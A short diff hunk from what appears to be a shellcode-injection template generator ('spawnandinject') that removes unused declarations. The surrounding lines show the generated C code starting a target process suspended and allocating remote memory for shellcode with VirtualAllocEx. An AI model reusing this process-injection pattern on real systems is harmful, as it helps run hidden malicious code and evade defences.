@@ -67,13 +67,6 @@ class spawnandinject:
     }}; 
     PROCESS_INFORMATION pi; 
 
-    PPEB pPeb;
-    PVOID pImage, pEntry;
-    PIMAGE_NT_HEADERS pNtHeaders;
-    LONG e_lfanew;
-    SIZE_T NumberOfBytesRead;
-    DWORD AddressOfEntryPoint;
-
     {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     LPVOID pRemoteCode = {VirtualAllocEx}(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
